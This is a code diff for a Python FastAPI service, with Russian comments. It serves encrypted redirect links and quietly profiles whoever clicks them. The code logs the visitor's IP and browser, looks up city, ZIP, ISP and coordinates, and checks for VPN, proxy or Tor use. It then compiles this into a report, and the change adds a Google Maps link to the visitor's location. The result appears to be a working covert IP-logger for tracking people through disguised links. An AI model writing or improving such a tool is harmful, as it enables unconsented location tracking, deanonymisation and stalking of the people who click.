@@ -10,10 +10,11 @@ import user_agents
 app = FastAPI()
 cipher = Fernet(SECRET_KEY)
 
-VPNAPI_TOKEN = ""  # оставь пустым, бесплатный план позволяет без токена
+IPINFO_TOKEN = ""  # Бесплатный план без токена до 50k запросов/мес
 
 @app.get("/link/{encrypted_url}")
 async def redirect_encrypted(request: Request, encrypted_url: str):
+    # Расшифровка ссылки
     try:
         data_json = cipher.decrypt(encrypted_url.encode()).decode()
         data = json.loads(data_json)
@@ -28,35 +29,37 @@ async def redirect_encrypted(request: Request, encrypted_url: str):
     ua = user_agents.parse(user_agent_str)
     accept_lang = headers.get("accept-language", "N/A")
 
-    # Гео-информация
     geo_info = {}
-    try:
-        response = httpx.get(f"http://ip-api.com/json/{ip}")
-        geo_info = response.json()
-    except:
-        pass
-
-    # VPN/Proxy/Tor через vpnapi.io
     vpn_info = {}
-    try:
-        url = f"https://vpnapi.io/api/{ip}?strictness=1&key={VPNAPI_TOKEN}"
-        response = httpx.get(url)
-        if response.status_code == 200:
-            data_vpn = response.json()
+
+    async with httpx.AsyncClient() as client:
+        # Гео и сетевые данные через ip-api.com
+        try:
+            geo_resp = await client.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,zip,lat,lon,isp")
+            geo_info = geo_resp.json() if geo_resp.status_code == 200 else {}
+        except:
+            geo_info = {}
+
+        # VPN/Proxy/Tor + ASN через ipinfo.io
+        try:
+            url = f"https://ipinfo.io/{ip}/json?token={IPINFO_TOKEN}" if IPINFO_TOKEN else f"https://ipinfo.io/{ip}/json"
+            info_resp = await client.get(url)
+            if info_resp.status_code == 200:
+                info = info_resp.json()
+                vpn_info = {
+                    "vpn": info.get("privacy", {}).get("vpn", "N/A"),
+                    "proxy": info.get("privacy", {}).get("proxy", "N/A"),
+                    "tor": info.get("privacy", {}).get("tor", "N/A"),
+                    "asn": info.get("org", "N/A").split(" ")[0] if info.get("org") else "N/A",
+                    "org": info.get("org", "N/A"),
+                    "connection_type": info.get("type", "N/A"),
+                    "timezone": info.get("timezone", "N/A")
+                }
+        except:
             vpn_info = {
-                "vpn": data_vpn.get("security", {}).get("vpn", False),
-                "proxy": data_vpn.get("security", {}).get("proxy", False),
-                "tor": data_vpn.get("security", {}).get("tor", False),
-                "asn": data_vpn.get("asn", "N/A"),
-                "org": data_vpn.get("organization", "N/A"),
-                "connection_type": data_vpn.get("connection_type", "N/A"),
-                "timezone": data_vpn.get("time_zone", "N/A")
+                "vpn": "N/A", "proxy": "N/A", "tor": "N/A",
+                "asn": "N/A", "org": "N/A", "connection_type": "N/A", "timezone": "N/A"
             }
-    except:
-        vpn_info = {
-            "vpn": "N/A", "proxy": "N/A", "tor": "N/A",
-            "asn": "N/A", "org": "N/A", "connection_type": "N/A", "timezone": "N/A"
-        }
 
     # Формируем сообщение
     msg_text = f"""
@@ -77,7 +80,8 @@ async def redirect_encrypted(request: Request, encrypted_url: str):
 - Город: {geo_info.get('city', 'N/A')}
 - ZIP: {geo_info.get('zip', 'N/A')}
 - ISP: {geo_info.get('isp', 'N/A')}
-- Координаты (Ширина/Долгота)я: {geo_info.get('lat', 'N/A')}, {geo_info.get('lon', 'N/A')}
+- Координаты (Широта/Долгота): {geo_info.get('lat', 'N/A')}, {geo_info.get('lon', 'N/A')}
+- Ссылка на Google Maps: https://www.google.com/maps?q={geo_info.get('lat', 'N/A')},{geo_info.get('lon', 'N/A')}
 
 🌐 Сетевая информация:
 - ASN: {vpn_info.get('asn')}
